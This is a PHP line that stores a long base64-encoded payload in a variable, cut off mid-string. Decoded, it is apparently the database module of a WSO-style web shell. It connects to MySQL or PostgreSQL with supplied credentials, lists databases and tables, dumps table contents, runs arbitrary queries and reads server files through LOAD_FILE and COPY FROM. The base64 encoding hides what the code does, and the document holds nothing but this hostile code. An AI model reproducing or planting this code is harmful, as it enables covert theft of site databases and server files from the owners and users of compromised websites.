$tkl = "ZWNobyAiPHNjcmlwdD4gICAgIHZhciBwMV8gPSAnIiAuICgoc3RycG9zKEAkX1BPU1RbJ3AxJ10sIlxuIikhPT1mYWxzZSk/Jyc6aHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ3AxJ10sRU5UX1FVT1RFUykpIC4iJzsgICAgIHZhciBwMl8gPSAnIiAuICgoc3RycG9zKEAkX1BPU1RbJ3AyJ10sIlxuIikhPT1mYWxzZSk/Jyc6aHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ3AyJ10sRU5UX1FVT1RFUykpIC4iJzsgICAgIHZhciBwM18gPSAnIiAuICgoc3RycG9zKEAkX1BPU1RbJ3AzJ10sIlxuIikhPT1mYWxzZSk/Jyc6aHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ3AzJ10sRU5UX1FVT1RFUykpIC4iJzsgICAgIHZhciBkID0gZG9jdW1lbnQ7IAlmdW5jdGlvbiBzZXQoYSxjLHAxLHAyLHAzLGNoYXJzZXQpIHsgCQlpZihhIT1udWxsKWQubWYuYS52YWx1ZT1hO2Vsc2UgZC5tZi5hLnZhbHVlPWFfOyAJCWlmKGMhPW51bGwpZC5tZi5jLnZhbHVlPWM7ZWxzZSBkLm1mLmMudmFsdWU9Y187IAkJaWYocDEhPW51bGwpZC5tZi5wMS52YWx1ZT1wMTtlbHNlIGQubWYucDEudmFsdWU9cDFfOyAJCWlmKHAyIT1udWxsKWQubWYucDIudmFsdWU9cDI7ZWxzZSBkLm1mLnAyLnZhbHVlPXAyXzsgCQlpZihwMyE9bnVsbClkLm1mLnAzLnZhbHVlPXAzO2Vsc2UgZC5tZi5wMy52YWx1ZT1wM187IAkJaWYoY2hhcnNldCE9bnVsbClkLm1mLmNoYXJzZXQudmFsdWU9Y2hhcnNldDtlbHNlIGQubWYuY2hhcnNldC52YWx1ZT1jaGFyc2V0XzsgCX0gCWZ1bmN0aW9uIGcoYSxjLHAxLHAyLHAzLGNoYXJzZXQpIHsgCQlzZXQoYSxjLHAxLHAyLHAzLGNoYXJzZXQpOyAJCWQubWYuc3VibWl0KCk7IAl9ICA8L3NjcmlwdD4iOyAJY2xhc3MgRGJDbGFzcyB7IAkJdmFyICR0eXBlOyAJCXZhciAkbGluazsgCQl2YXIgJHJlczsgCQlmdW5jdGlvbiBEYkNsYXNzKCR0eXBlKQl7IAkJCSR0aGlzLT50eXBlID0gJHR5cGU7IAkJfSAJCWZ1bmN0aW9uIGNvbm5lY3QoJGhvc3QsICR1c2VyLCAkcGFzcywgJGRibmFtZSl7IAkJCXN3aXRjaCgkdGhpcy0+dHlwZSkJeyAJCQkJY2FzZSAnbXlzcWwnOiAJCQkJCWlmKCAkdGhpcy0+bGluayA9IEBteXNxbF9jb25uZWN0KCRob3N0LCR1c2VyLCRwYXNzLHRydWUpICkgcmV0dXJuIHRydWU7IAkJCQkJYnJlYWs7IAkJCQljYXNlICdwZ3NxbCc6IAkJCQkJJGhvc3QgPSBleHBsb2RlKCc6JywgJGhvc3QpOyAJCQkJCWlmKCEkaG9zdFsxXSkgJGhvc3RbMV09NTQzMjsgCQkJCQlpZiggJHRoaXMtPmxpbmsgPSBAcGdfY29ubmVjdCgiaG9zdD17JGhvc3RbMF19IHBvcnQ9eyRob3N0WzFdfSB1c2VyPSR1c2VyIHBhc3N3b3JkPSRwYXNzIGRibmFtZT0kZGJuYW1lIikgKSByZXR1cm4gdHJ1ZTsgCQkJCQlicmVhazsgCQkJfSAJCQlyZXR1cm4gZmFsc2U7IAkJfSAJCWZ1bmN0aW9uIHNlbGVjdGRiKCRkYikgeyAJCQlzd2l0Y2goJHRoaXMtPnR5cGUpCXsgCQkJCWNhc2UgJ215c3FsJzogCQkJCQlpZiAoQG15c3FsX3NlbGVjdF9kYigkZGIpKXJldHVybiB0cnVlOyAJCQkJCWJyZWFrOyAJCQl9IAkJCXJldHVybiBmYWxzZTsgCQl9IAkJZnVuY3Rpb24gcXVlcnkoJHN0cikgeyAJCQlzd2l0Y2goJHRoaXMtPnR5cGUpIHsgCQkJCWNhc2UgJ215c3FsJzogCQkJCQlyZXR1cm4gJHRoaXMtPnJlcyA9IEBteXNxbF9xdWVyeSgkc3RyKTsgCQkJCQlicmVhazsgCQkJCWNhc2UgJ3Bnc3FsJzogCQkJCQlyZXR1cm4gJHRoaXMtPnJlcyA9IEBwZ19xdWVyeSgkdGhpcy0+bGluaywkc3RyKTsgCQkJCQlicmVhazsgCQkJfSAJCQlyZXR1cm4gZmFsc2U7IAkJfSAJCWZ1bmN0aW9uIGZldGNoKCkgeyAJCQkkcmVzID0gZnVuY19udW1fYXJncygpP2Z1bmNfZ2V0X2FyZygwKTokdGhpcy0+cmVzOyAJCQlzd2l0Y2goJHRoaXMtPnR5cGUpCXsgCQkJCWNhc2UgJ215c3FsJzogCQkJCQlyZXR1cm4gQG15c3FsX2ZldGNoX2Fzc29jKCRyZXMpOyAJCQkJCWJyZWFrOyAJCQkJY2FzZSAncGdzcWwnOiAJCQkJCXJldHVybiBAcGdfZmV0Y2hfYXNzb2MoJHJlcyk7IAkJCQkJYnJlYWs7IAkJCX0gCQkJcmV0dXJuIGZhbHNlOyAJCX0gCQlmdW5jdGlvbiBsaXN0RGJzKCkgeyAJCQlzd2l0Y2goJHRoaXMtPnR5cGUpCXsgCQkJCWNhc2UgJ215c3FsJzogICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5xdWVyeSgiU0hPVyBkYXRhYmFzZXMiKTsgCQkJCWJyZWFrOyAJCQkJY2FzZSAncGdzcWwnOiAJCQkJCXJldHVybiAkdGhpcy0+cmVzID0gJHRoaXMtPnF1ZXJ5KCJTRUxFQ1QgZGF0bmFtZSBGUk9NIHBnX2RhdGFiYXNlIFdIRVJFIGRhdGlzdGVtcGxhdGUhPSd0JyIpOyAJCQkJYnJlYWs7IAkJCX0gCQkJcmV0dXJuIGZhbHNlOyAJCX0gCQlmdW5jdGlvbiBsaXN0VGFibGVzKCkgeyAJCQlzd2l0Y2goJHRoaXMtPnR5cGUpCXsgCQkJCWNhc2UgJ215c3FsJzogCQkJCQlyZXR1cm4gJHRoaXMtPnJlcyA9ICR0aGlzLT5xdWVyeSgnU0hPVyBUQUJMRVMnKTsgCQkJCWJyZWFrOyAJCQkJY2FzZSAncGdzcWwnOiAJCQkJCXJldHVybiAkdGhpcy0+cmVzID0gJHRoaXMtPnF1ZXJ5KCJzZWxlY3QgdGFibGVfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hICE9ICdpbmZvcm1hdGlvbl9zY2hlbWEnIEFORCB0YWJsZV9zY2hlbWEgIT0gJ3BnX2NhdGFsb2cnIik7IAkJCQlicmVhazsgCQkJfSAJCQlyZXR1cm4gZmFsc2U7IAkJfSAJCWZ1bmN0aW9uIGVycm9yKCkgeyAJCQlzd2l0Y2goJHRoaXMtPnR5cGUpCXsgCQkJCWNhc2UgJ215c3FsJzogCQkJCQlyZXR1cm4gQG15c3FsX2Vycm9yKCk7IAkJCQlicmVhazsgCQkJCWNhc2UgJ3Bnc3FsJzogCQkJCQlyZXR1cm4gQHBnX2xhc3RfZXJyb3IoKTsgCQkJCWJyZWFrOyAJCQl9IAkJCXJldHVybiBmYWxzZTsgCQl9IAkJZnVuY3Rpb24gc2V0Q2hhcnNldCgkc3RyKSB7IAkJCXN3aXRjaCgkdGhpcy0+dHlwZSkJeyAJCQkJY2FzZSAnbXlzcWwnOiAJCQkJCWlmKGZ1bmN0aW9uX2V4aXN0cygnbXlzcWxfc2V0X2NoYXJzZXQnKSkgCQkJCQkJcmV0dXJuIEBteXNxbF9zZXRfY2hhcnNldCgkc3RyLCAkdGhpcy0+bGluayk7IAkJCQkJZWxzZSAJCQkJCQkkdGhpcy0+cXVlcnkoJ1NFVCBDSEFSU0VUICcuJHN0cik7IAkJCQkJYnJlYWs7IAkJCQljYXNlICdwZ3NxbCc6IAkJCQkJcmV0dXJuIEBwZ19zZXRfY2xpZW50X2VuY29kaW5nKCR0aGlzLT5saW5rLCAkc3RyKTsgCQkJCQlicmVhazsgCQkJfSAJCQlyZXR1cm4gZmFsc2U7IAkJfSAJCWZ1bmN0aW9uIGxvYWRGaWxlKCRzdHIpIHsgCQkJc3dpdGNoKCR0aGlzLT50eXBlKQl7IAkJCQljYXNlICdteXNxbCc6IAkJCQkJcmV0dXJuICR0aGlzLT5mZXRjaCgkdGhpcy0+cXVlcnkoIlNFTEVDVCBMT0FEX0ZJTEUoJyIuYWRkc2xhc2hlcygkc3RyKS4iJykgYXMgZmlsZSIpKTsgCQkJCWJyZWFrOyAJCQkJY2FzZSAncGdzcWwnOiAJCQkJCSR0aGlzLT5xdWVyeSgiQ1JFQVRFIFRBQkxFIHdzbzIoZmlsZSB0ZXh0KTtDT1BZIHdzbzIgRlJPTSAnIi5hZGRzbGFzaGVzKCRzdHIpLiInO3NlbGVjdCBmaWxlIGZyb20gd3NvMjsiKTsgCQkJCQkkcj1hcnJheSgpOyAJCQkJCXdoaWxlKCRpPSR0aGlzLT5mZXRjaCgpKSAJCQkJCQkkcltdID0gJGlbJ2ZpbGUnXTsgCQkJCQkkdGhpcy0+cXVlcnkoJ2Ryb3AgdGFibGUgd3NvMicpOyAJCQkJCXJldHVybiBhcnJheSgnZmlsZSc9PmltcGxvZGUoIlxuIiwkcikpOyAJCQkJYnJlYWs7IAkJCX0gCQkJcmV0dXJuIGZhbHNlOyAJCX0gCQlmdW5jdGlvbiBkdW1wKCR0YWJsZSwgJGZwID0gZmFsc2UpIHsgCQkJc3dpdGNoKCR0aGlzLT50eXBlKQl7IAkJCQljYXNlICdteXNxbCc6IAkJCQkJJHJlcyA9ICR0aGlzLT5xdWVyeSgnU0hPVyBDUkVBVEUgVEFCTEUgYCcuJHRhYmxlLidgJyk7IAkJCQkJJGNyZWF0ZSA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXMpOyAJCQkJCSRzcWwgPSAkY3JlYXRlWzFdLiI7XG4iOyAgICAgICAgICAgICAgICAgICAgIGlmKCRmcCkgZndyaXRlKCRmcCwgJHNxbCk7IGVsc2UgZWNobygkc3FsKTsgCQkJCQkkdGhpcy0+cXVlcnkoJ1NFTEVDVCAqIEZST00gYCcuJHRhYmxlLidgJyk7ICAgICAgICAgICAgICAgICAgICAgJGhlYWQgPSB0cnVlOyAJCQkJCXdoaWxlKCRpdGVtID0gJHRoaXMtPmZldGNoKCkpIHsgCQkJCQkJJGNvbHVtbnMgPSBhcnJheSgpOyAJCQkJCQlmb3JlYWNoKCRpdGVtIGFzICRrPT4kdikgeyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJHYgPT0gbnVsbCkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaXRlbVska10gPSAiTlVMTCI7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoaXNfbnVtZXJpYygkdikpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGl0ZW1bJGtdID0gJHY7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGl0ZW1bJGtdID0gIiciLkBteXNxbF9yZWFsX2VzY2FwZV9zdHJpbmcoJHYpLiInIjsgCQkJCQkJCSRjb2x1bW5zW10gPSAiYCIuJGsuImAiOyAJCQkJCQl9ICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRoZWFkKSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3FsID0gJ0lOU0VSVCBJTlRPIGAnLiR0YWJsZS4nYCAoJy5pbXBsb2RlKCIsICIsICRjb2x1bW5zKS4iKSBWQUxVRVMgXG5cdCgiLmltcGxvZGUoIiwgIiwgJGl0ZW0pLicpJzsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRoZWFkID0gZmFsc2U7ICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNxbCA9ICJcblx0LCgiLmltcGxvZGUoIiwgIiwgJGl0ZW0pLicpJzsgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGZwKSBmd3JpdGUoJGZwLCAkc3FsKTsgZWxzZSBlY2hvKCRzcWwpOyAJCQkJCX0gICAgICAgICAgICAgICAgICAgICBpZighJGhlYWQpICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRmcCkgZndyaXRlKCRmcCwgIjtcblxuIik7IGVsc2UgZWNobygiO1xuXG4iKTsgCQkJCWJyZWFrOyAJCQkJY2FzZSAncGdzcWwnOiAJCQkJCSR0aGlzLT5xdWVyeSgnU0VMRUNUICogRlJPTSAnLiR0YWJsZSk7IAkJCQkJd2hpbGUoJGl0ZW0gPSAkdGhpcy0+ZmV0Y2goKSkgeyAJCQkJCQkkY29sdW1ucyA9IGFycmF5KCk7IAkJCQkJCWZvcmVhY2goJGl0ZW0gYXMgJGs9PiR2KSB7IAkJCQkJCQkkaXRlbVska10gPSAiJyIuYWRkc2xhc2hlcygkdikuIiciOyAJCQkJCQkJJGNvbHVtbnNbXSA9ICRrOyAJCQkJCQl9ICAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSAnSU5TRVJUIElOVE8gJy4kdGFibGUuJyAoJy5pbXBsb2RlKCIsICIsICRjb2x1bW5zKS4nKSBWQUxVRVMgKCcuaW1wbG9kZSgiLCAiLCAkaXRlbSkuJyk7Jy4iXG4iOyAgICAgICAgICAgICAgICAgICAgICAgICBpZigkZnApIGZ3cml0ZSgkZnAsICRzcWwpOyBlbHNlIGVjaG8oJHNxbCk7IAkJCQkJfSAJCQkJYnJlYWs7IAkJCX0gCQkJcmV0dXJuIGZhbHNlOyAJCX0gCX07IAkkZGIgPSBuZXcgRGJDbGFzcygkX1BPU1RbJ3R5cGUnXSk7IAlpZihAJF9QT1NUWydwMiddPT0nZG93bmxvYWQnKSB7IAkJJGRiLT5jb25uZWN0KCRfUE9TVFsnc3FsX2hvc3QnXSwgJF9QT1NUWydzcWxfbG9naW4nXSwgJF9QT1NUWydzcWxfcGFzcyddLCAkX1BPU1RbJ3NxbF9iYXNlJ10pOyAJCSRkYi0+c2VsZWN0ZGIoJF9QT1NUWydzcWxfYmFzZSddKTsgICAgICAgICBzd2l0Y2goJF9QT1NUWydjaGFyc2V0J10pIHsgICAgICAgICAgICAgY2FzZSAiV2luZG93cy0xMjUxIjogJGRiLT5zZXRDaGFyc2V0KCdjcDEyNTEnKTsgYnJlYWs7ICAgICAgICAgICAgIGNhc2UgIlVURi04IjogJGRiLT5zZXRDaGFyc2V0KCd1dGY4Jyk7IGJyZWFrOyAgICAgICAgICAgICBjYXNlICJLT0k4LVIiOiAkZGItPnNldENoYXJzZXQoJ2tvaThyJyk7IGJyZWFrOyAgICAgICAgICAgICBjYXNlICJLT0k4LVUiOiAkZGItPnNldENoYXJzZXQoJ2tvaTh1Jyk7IGJyZWFrOyAgICAgICAgICAgICBjYXNlICJjcDg2NiI6ICRkYi0+c2V0Q2hhcnNldCgnY3A4NjYnKTsgYnJlYWs7ICAgICAgICAgfSAgICAgICAgIGlmKGVtcHR5KCRfUE9TVFsnZmlsZSddKSkgeyAgICAgICAgICAgICBvYl9zdGFydCgib2JfZ3poYW5kbGVyIiwgNDA5Nik7ICAgICAgICAgICAgIGhlYWRlcigiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9ZHVtcC5zcWwiKTsgICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvcGxhaW4iKTsgICAgICAgICAgICAgZm9yZWFjaCgkX1BPU1RbJ3RibCddIGFzICR2KSAJCQkJJGRiLT5kdW1wKCR2KTsgICAgICAgICAgICAgZXhpdDsgICAgICAgICB9IGVsc2VpZigkZnAgPSBAZm9wZW4oJF9QT1NUWydmaWxlJ10sICd3JykpIHsgICAgICAgICAgICAgZm9yZWFjaCgkX1BPU1RbJ3RibCddIGFzICR2KSAgICAgICAgICAgICAgICAgJGRiLT5kdW1wKCR2LCAkZnApOyAgICAgICAgICAgICBmY2xvc2UoJGZwKTsgICAgICAgICAgICAgdW5zZXQoJF9QT1NUWydwMiddKTsgICAgICAgICB9IGVsc2UgICAgICAgICAgICAgZGllKCc8c2NyaXB0PmFsZXJ0KCJFcnJvciEgQ2FuXCd0IG9wZW4gZmlsZSIpO3dpbmRvdy5oaXN0b3J5LmJhY2soLTEpPC9zY3JpcHQ+Jyk7IAl9ICAJZWNobyAiIDxkaXYgY2xhc3M9Y29udGVudD4gPGZvcm0gbmFtZT0nc2YnIG1ldGhvZD0ncG9zdCcgb25zdWJtaXQ9J2ZzKHRoaXMpOyc+PHRhYmxlIGNlbGxwYWRkaW5nPScyJyBjZWxsc3BhY2luZz0nMCc+PHRyPiA8dGQ+VHlwZTwvdGQ+PHRkPkhvc3Q8L3RkPjx0ZD5Mb2dpbjwvdGQ+PHRkPlBhc3N3b3JkPC90ZD48dGQ+RGF0YWJhc2U8L3RkPjx0ZD48L3RkPjwvdHI+PHRyPiA8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPVNxbD48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1wMSB2YWx1ZT0ncXVlcnknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXAyIHZhbHVlPScnPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWMgdmFsdWU9JyIuIGh0bWxzcGVjaWFsY2hhcnMoJEdMT0JBTFNbJ2N3ZCddKSAuIic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9Y2hhcnNldCB2YWx1ZT0nIi4gKGlzc2V0KCRfUE9TVFsnY2hhcnNldCddKT8kX1BPU1RbJ2NoYXJzZXQnXTonJykgLiInPiA8dGQ+PHNlbGVjdCBuYW1lPSd0eXBlJz48b3B0aW9uIHZhbHVlPSdteXNxbCcgIjsgICAgIGlmKEAkX1BPU1RbJ3R5cGUnXT09J215c3FsJyllY2hvICdzZWxlY3RlZCc7IGVjaG8gIj5NeVNxbDwvb3B0aW9uPjxvcHRpb24gdmFsdWU9J3Bnc3FsJyAiOyBpZihAJF9QT1NUWyd0eXBlJ109PSdwZ3NxbCcpZWNobyAnc2VsZWN0ZWQnOyBlY2hvICI+UG9zdGdyZVNxbDwvb3B0aW9uPjwvc2VsZWN0PjwvdGQ+IDx0ZD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9c3FsX2hvc3QgdmFsdWU9JyIuIChlbXB0eSgkX1BPU1RbJ3NxbF9ob3N0J10pPydsb2NhbGhvc3QnOmh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydzcWxfaG9zdCddKSkgLiInPjwvdGQ+IDx0ZD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9c3FsX2xvZ2luIHZhbHVlPSciLiAoZW1wdHkoJF9QT1NUWydzcWxfbG9naW4nXSk/J3Jvb3QnOmh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydzcWxfbG9naW4nXSkpIC4iJz48L3RkPiA8dGQ+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXNxbF9wYXNzIHZhbHVlPSciLiAoZW1wdHkoJF9QT1NUWydzcWxfcGFzcyddKT8nJzpodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnc3FsX3Bhc3MnXSkpIC4iJz48L3RkPjx0ZD4iOyAJJHRtcCA9ICI8aW5wdXQgdHlwZT10ZXh0IG5hbWU9c3FsX2Jhc2UgdmFsdWU9Jyc+IjsgCWlmKGlzc2V0KCRfUE9TVFsnc3FsX2hvc3QnXSkpeyAJCWlmKCRkYi0+Y29ubmVjdCgkX1BPU1RbJ3NxbF9ob3N0J10sICRfUE9TVFsnc3FsX2xvZ2luJ10sICRfUE9TVFsnc3FsX3Bhc3MnXSwgJF9QT1NUWydzcWxfYmFzZSddKSkgeyAJCQlzd2l0Y2goJF9QT1NUWydjaGFyc2V0J10pIHsgCQkJCWNhc2UgIldpbmRvd3MtMTI1MSI6ICRkYi0+c2V0Q2hhcnNldCgnY3AxMjUxJyk7IGJyZWFrOyAJCQkJY2FzZSAiVVRGLTgiOiAkZGItPnNldENoYXJzZXQoJ3V0ZjgnKTsgYnJlYWs7IAkJCQljYXNlICJLT0k4LVIiOiAkZGItPnNldENoYXJzZXQoJ2tvaThyJyk7IGJyZWFrOyAJCQkJY2FzZSAiS09JOC1VIjogJGRiLT5zZXRDaGFyc2V0KCdrb2k4dScpOyBicmVhazsgCQkJCWNhc2UgImNwODY2IjogJGRiLT5zZXRDaGFyc2V0KCdjcDg2NicpOyBicmVhazsgCQkJfSAJCQkkZGItPmxpc3REYnMoKTsgCQkJZWNobyAiPHNlbGVjdCBuYW1lPXNxbF9iYXNlPjxvcHRpb24gdmFsdWU9Jyc+PC9vcHRpb24+IjsgCQkJd2hpbGUoJGl0ZW0gPSAkZGItPmZldGNoKCkpIHsgCQkJCWxpc3QoJGtleSwgJHZhbHVlKSA9IGVhY2goJGl0ZW0pOyAJCQkJZWNobyAnPG9wdGlvbiB2YWx1ZT0iJy4kdmFsdWUuJyIgJy4oJHZhbHVlPT0kX1BPU1RbJ3NxbF9iYXNlJ10/J3NlbGVjdGVkJzonJykuJz4nLiR2YWx1ZS4nPC9vcHRpb24+JzsgCQkJfSAJCQllY2hvICc8L3NlbGVjdD4nOyAJCX0gCQllbHNlIGVjaG8gJHRtcDsgCX1lbHNlIAkJZWNobyAkdG1wOyAJZWNobyAiPC90ZD4gCQkJCTx0ZD48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Jz4+JyBvbmNsaWNrPSdmcyhkLnNmKTsnPjwvdGQ+ICAgICAgICAgICAgICAgICA8dGQ+PGlucHV0IHR5cGU9Y2hlY2tib3ggbmFtZT1zcWxfY291bnQgdmFsdWU9J29uJyIgLiAoZW1wdHkoJF9QT1NUWydzcWxfY291bnQnXSk/Jyc6JyBjaGVja2VkJykgLiAiPiBjb3VudCB0aGUgbnVtYmVyIG9mIHJvd3M8L3RkPiAJCQk8L3RyPiAJCTwvdGFibGU+IAkJPHNjcmlwdD4gICAgICAgICAgICAgc19kYj0nIi5AYWRkc2xhc2hlcygkX1BPU1RbJ3NxbF9iYXNlJ10pLiInOyAgICAgICAgICAgICBmdW5jdGlvbiBmcyhmKSB7ICAgICAgICAgICAgICAgICBpZihmLnNxbF9iYXNlLnZhbHVlIT1zX2RiKSB7IGYub25zdWJtaXQgPSBmdW5jdGlvbigpIHt9OyAgICAgICAgICAgICAgICAgICAgIGlmKGYucDEpIGYucDEudmFsdWU9Jyc7ICAgICAgICAgICAgICAgICAgICAgaWYoZi5wMikgZi5wMi52YWx1ZT0nJzsgICAgICAgICAgICAgICAgICAgICBpZihmLnAzKSBmLnAzLnZhbHVlPScnOyAgICAgICAgICAgICAgICAgfSAgICAgICAgICAgICB9IAkJCWZ1bmN0aW9uIHN0KHQsbCkgeyAJCQkJZC5zZi5wMS52YWx1ZSA9ICdzZWxlY3QnOyAJCQkJZC5zZi5wMi52YWx1ZSA9IHQ7ICAgICAgICAgICAgICAgICBpZihsICYmIGQuc2YucDMpIGQuc2YucDMudmFsdWUgPSBsOyAJCQkJZC5zZi5zdWJtaXQoKTsgCQkJfSAJCQlmdW5jdGlvbiBpcygpIHsgCQkJCWZvcihpPTA7aTxkLnNmLmVsZW1lbnRzWyd0YmxbXSddLmxlbmd0aDsrK2kpIAkJCQkJZC5zZi5lbGVtZW50c1sndGJsW10nXVtpXS5jaGVja2VkID0gIWQuc2YuZWxlbWVudHNbJ3RibFtdJ11baV0uY2hlY2tlZDsgCQkJfSAJCTwvc2NyaXB0PiI7IAlpZihpc3NldCgkZGIpICYmICRkYi0+bGluayl7IAkJZWNobyAiPGJyLz48dGFibGUgd2lkdGg9MTAwJSBjZWxscGFkZGluZz0yIGNlbGxzcGFjaW5nPTA+IjsgCQkJaWYoIWVtcHR5KCRfUE9TVFsnc3FsX2Jhc2UnXSkpeyAJCQkJJGRiLT5zZWxlY3RkYigkX1BPU1RbJ3NxbF9iYXNlJ10pOyAJCQkJZWNobyAiPHRyPjx0ZCB3aWR0aD0xIHN0eWxlPSdib3JkZXItdG9wOjJweCBzb2xpZCAjNjY2Oyc+PHNwYW4+VGFibGVzOjwvc3Bhbj48YnI+PGJyPiI7IAkJCQkkdGJsc19yZXMgPSAkZGItPmxpc3RUYWJsZXMoKTsgCQkJCXdoaWxlKCRpdGVtID0gJGRiLT5mZXRjaCgkdGJsc19yZXMpKSB7IAkJCQkJbGlzdCgka2V5LCAkdmFsdWUpID0gZWFjaCgkaXRlbSk7ICAgICAgICAgICAgICAgICAgICAgaWYoIWVtcHR5KCRfUE9TVFsnc3FsX2NvdW50J10pKSAgICAgICAgICAgICAgICAgICAgICAgICAkbiA9ICRkYi0+ZmV0Y2goJGRiLT5xdWVyeSgnU0VMRUNUIENPVU5UKCopIGFzIG4gRlJPTSAnLiR2YWx1ZS4nJykpOyAJCQkJCSR2YWx1ZSA9IGh0bWxzcGVjaWFsY2hhcnMoJHZhbHVlKTsgCQkJCQllY2hvICI8bm9icj48aW5wdXQgdHlwZT0nY2hlY2tib3gnIG5hbWU9J3RibFtdJyB2YWx1ZT0nIi4kdmFsdWUuIic+Jm5ic3A7PGEgaHJlZj0jIG9uY2xpY2s9XCJzdCgnIi4kdmFsdWUuIicsMSlcIj4iLiR2YWx1ZS4iPC9hPiIgLiAoZW1wdHkoJF9QT1NUWydzcWxfY291bnQnXSk/JyZuYnNwOyc6IiA8c21hbGw+KHskblsnbiddfSk8L3NtYWxsPiIpIC4gIjwvbm9icj48YnI+IjsgCQkJCX0gCQkJCWVjaG8gIjxpbnB1dCB0eXBlPSdjaGVja2JveCcgb25jbGljaz0naXMoKTsnPiA8aW5wdXQgdHlwZT1idXR0b24gdmFsdWU9J0R1bXAnIG9uY2xpY2s9J2RvY3VtZW50LnNmLnAyLnZhbHVlPVwiZG93bmxvYWRcIjtkb2N1bWVudC5zZi5zdWJtaXQoKTsnPjxicj5GaWxlIHBhdGg6PGlucHV0IHR5cGU9dGV4dCBuYW1lPWZpbGUgdmFsdWU9J2R1bXAuc3FsJz48L3RkPjx0ZCBzdHlsZT0nYm9yZGVyLXRvcDoycHggc29saWQgIzY2NjsnPiI7IAkJCQlpZihAJF9QT1NUWydwMSddID09ICdzZWxlY3QnKSB7IAkJCQkJJF9QT1NUWydwMSddID0gJ3F1ZXJ5JzsgICAgICAgICAgICAgICAgICAgICAkX1BPU1RbJ3AzJ10gPSAkX1BPU1RbJ3AzJ10/JF9QT1NUWydwMyddOjE7IAkJCQkJJGRiLT5xdWVyeSgnU0VMRUNUIENPVU5UKCopIGFzIG4gRlJPTSAnIC4gJF9QT1NUWydwMiddKTsgCQkJCQkkbnVtID0gJGRiLT5mZXRjaCgpOyAJCQkJCSRwYWdlcyA9IGNlaWwoJG51bVsnbiddIC8gMzApOyAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjxzY3JpcHQ+ZC5zZi5vbnN1Ym1pdD1mdW5jdGlvbigpe3N0KFwiIiAuICRfUE9TVFsncDInXSAuICJcIiwgZC5zZi5wMy52YWx1ZSl9PC9zY3JpcHQ+PHNwYW4+Ii4kX1BPU1RbJ3AyJ10uIjwvc3Bhbj4gKHskbnVtWyduJ119IHJlY29yZHMpIFBhZ2UgIyA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9J3AzJyB2YWx1ZT0iIC4gKChpbnQpJF9QT1NUWydwMyddKSAuICI+IjsgICAgICAgICAgICAgICAgICAgICBlY2hvICIgb2YgJHBhZ2VzIjsgICAgICAgICAgICAgICAgICAgICBpZigkX1BPU1RbJ3AzJ10gPiAxKSAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICIgPGEgaHJlZj0jIG9uY2xpY2s9J3N0KFwiIiAuICRfUE9TVFsncDInXSAuICciLCAnIC4gKCRfUE9TVFsncDMnXS0xKSAuICIpJz4mbHQ7IFByZXY8L2E+IjsgICAgICAgICAgICAgICAgICAgICBpZigkX1BPU1RbJ3AzJ10gPCAkcGFnZXMpICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIiA8YSBocmVmPSMgb25jbGljaz0nc3QoXCIiIC4gJF9QT1NUWydwMiddIC4gJyIsICcgLiAoJF9QT1NUWydwMyddKzEpIC4gIiknPk5leHQgJmd0OzwvYT4iOyAgICAgICAgICAgICAgICAgICAgICRfUE9TVFsncDMnXS0tOyAJCQkJCWlmKCRfUE9TVFsndHlwZSddPT0ncGdzcWwnKSAJCQkJCQkkX1BPU1RbJ3AyJ10gPSAnU0VMRUNUICogRlJPTSAnLiRfUE9TVFsncDInXS4nIExJTUlUIDMwIE9GRlNFVCAnLigkX1BPU1RbJ3AzJ10qMzApOyAJCQkJCWVsc2UgCQkJCQkJJF9QT1NUWydwMiddID0gJ1NFTEVDVCAqIEZST00gYCcuJF9QT1NUWydwMiddLidgIExJTUlUICcuKCRfUE9TVFsncDMnXSozMCkuJywzMCc7IAkJCQkJZWNobyAiPGJyPjxicj4iOyAJCQkJfSAJCQkJaWYoKEAkX1BPU1RbJ3AxJ10gPT0gJ3F1ZXJ5JykgJiYgIWVtcHR5KCRfUE9TVFsncDInXSkpIHsgCQkJCQkkZGItPnF1ZXJ5KEAkX1BPU1RbJ3AyJ10pOyAJCQkJCWlmKCRkYi0+cmVzICE9PSBmYWxzZSkgeyAJCQkJCQkkdGl0bGUgPSBmYWxzZTsgCQkJCQkJZWNobyAnPHRhYmxlIHdpZHRoPTEwMCUgY2VsbHNwYWNpbmc9MSBjZWxscGFkZGluZz0y